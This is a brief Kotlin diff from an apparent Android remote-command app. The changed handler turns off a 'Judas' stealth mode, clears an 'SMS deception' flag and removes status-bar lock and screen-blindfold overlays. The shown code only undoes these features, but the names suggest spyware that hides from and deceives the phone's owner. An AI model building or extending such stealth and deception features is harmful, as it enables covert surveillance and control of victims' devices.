@@ -1953,11 +1953,14 @@ object CommandProcessor {
                         // 1. Disable Stealth Mode (Restores volume & notifs)
                         JudasManager.disengageStealthMode(ctx)
                         
-                        // 2. Lift Status Bar Lock
+                        // 2. Lift Status Bar Lock & SMS Deception
                         ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE).edit()
-                            .putBoolean("status_bar_active", false).apply()
+                            .putBoolean("status_bar_active", false)
+                            .putBoolean("sms_deception_active", false)
+                            .apply()
                         Handler(Looper.getMainLooper()).post {
                             DynamicUIManager.removeStatusBarOverlay(ctx)
+                            DynamicUIManager.removeOverlay(ctx, "STEALTH_LOCK_RELEASED")
                         }
                         
                         // 3. Remove Screen Dimmer/Blindfold
